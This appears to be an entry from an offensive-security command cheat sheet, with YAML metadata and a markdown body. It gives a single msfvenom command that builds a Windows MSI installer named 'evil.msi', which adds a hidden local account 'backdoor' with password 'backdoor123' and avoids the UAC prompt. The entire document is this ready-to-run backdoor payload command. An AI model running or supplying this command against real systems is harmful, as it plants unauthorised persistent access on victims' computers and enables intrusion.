---
id: f644de45-3dc9-44d2-becc-2c71b7043fa0
name: Create MSI payload with backdoor user credentials (without UAC prompt)
type: command
executor: bash
data: $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o
  evil.msi
output: null
created_at: '2023-04-06T03:56:29.766355+00:00'
updated_at: '2023-04-10T20:37:33.387000+00:00'
---

# Create MSI payload with backdoor user credentials (without UAC prompt)

```bash
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
```
